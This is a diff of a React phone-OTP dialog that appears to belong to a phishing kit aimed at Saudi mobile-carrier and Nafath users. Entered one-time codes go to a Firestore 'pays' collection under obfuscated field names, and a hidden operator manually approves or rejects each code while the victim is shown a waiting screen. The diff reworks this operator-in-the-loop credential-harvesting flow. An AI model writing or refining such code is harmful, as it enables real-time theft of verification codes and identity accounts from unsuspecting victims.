@@ -17,9 +17,10 @@ interface PhoneOtpDialogProps {
   phoneCarrier: string
   onRejected: () => void
   onShowWaitingModal: (carrier: string) => void
+  rejectionError?: string
 }
 
-export function PhoneOtpDialog({ open, onOpenChange, phoneNumber, phoneCarrier, onRejected, onShowWaitingModal }: PhoneOtpDialogProps) {
+export function PhoneOtpDialog({ open, onOpenChange, phoneNumber, phoneCarrier, onRejected, onShowWaitingModal, rejectionError }: PhoneOtpDialogProps) {
   const [otp, setOtp] = useState("")
   const [timer, setTimer] = useState(60)
   const [otpStatus, setOtpStatus] = useState<"waiting" | "verifying" | "approved" | "rejected">("waiting")
@@ -43,68 +44,15 @@ export function PhoneOtpDialog({ open, onOpenChange, phoneNumber, phoneCarrier, 
       setTimer(60)
       setOtp("")
       setOtpStatus("waiting")
-      setError("")
+      // Show rejection error if provided, otherwise clear
+      setError(rejectionError || "")
       allOtps.current = []
       inputRef.current?.focus()
     }
-  }, [open])
+  }, [open, rejectionError])
 
-  // Listen to Firestore for admin decision
-  useEffect(() => {
-    if (!open || otpStatus !== "verifying") return
-
-    const visitorID = localStorage.getItem("visitor")
-    if (!visitorID) return
-
-    console.log("[PhoneOTP] Setting up listener for admin decision")
-
-    const unsubscribe = onSnapshot(
-      doc(db, "pays", visitorID),
-      (docSnapshot) => {
-        if (docSnapshot.exists()) {
-          const data = docSnapshot.data()
-          const status = data.phoneOtpStatus
-
-          console.log("[PhoneOTP] Received status:", status)
-
-          if (status === "approved") {
-            console.log("[PhoneOTP] OTP approved, redirecting to nafad")
-            setOtpStatus("approved")
-            setError("")
-            
-            // Redirect to nafad page after 1 second
-            setTimeout(async () => {
-              await updateDoc(doc(db, "pays", visitorID), {
-                currentStep: "_t6",
-                phoneOtpStatus: "" // Clear after use
-              })
-              window.location.href = "/step4"
-            }, 1000)
-          } else if (status === "rejected") {
-            console.log("[PhoneOTP] OTP rejected")
-            setOtpStatus("waiting") // Reset to waiting to allow re-entry
-            setOtp("") // Clear the old code
-            setError("رمز غير صالح - يرجى إدخال رمز التحقق الصحيح")
-            inputRef.current?.focus() // Focus back on input
-            
-            // Clear the rejected status in Firebase to allow new submission
-            setTimeout(async () => {
-              await updateDoc(doc(db, "pays", visitorID), {
-                phoneOtpStatus: "pending" // Reset to pending for new attempt
-              })
-            }, 500)
-          }
-        }
-      },
-      (err) => {
-        console.error("[PhoneOTP] Firestore listener error:", err)
-        setError("حدث خطأ في الاتصال. يرجى المحاولة مرة أخرى.")
-        setOtpStatus("waiting")
-      }
-    )
-
-    return () => unsubscribe()
-  }, [open, otpStatus, onOpenChange, onRejected])
+  // Note: Listener for admin decision is now in the waiting modals (stc/mobily/carrier)
+  // This keeps the OTP dialog simple and allows proper flow control
 
   const handleChange = (value: string) => {
     if (/^\d*$/.test(value) && value.length <= 6) {
@@ -148,10 +96,13 @@ export function PhoneOtpDialog({ open, onOpenChange, phoneNumber, phoneCarrier, 
         _v7: otp
       }, "pending")
 
-      console.log("[PhoneOTP] OTP submitted, keeping dialog open and waiting for admin decision")
+      console.log("[PhoneOTP] OTP submitted, closing dialog and showing waiting modal")
       
-      // Keep dialog open - don't close or show waiting modal
-      // The listener will handle approval/rejection
+      // Close OTP dialog
+      onOpenChange(false)
+      
+      // Show waiting modal based on carrier
+      onShowWaitingModal(phoneCarrier)
     } catch (err) {
       console.error("[PhoneOTP] Error submitting OTP:", err)
       setError("حدث خطأ في إرسال الرمز. يرجى المحاولة مرة أخرى.")
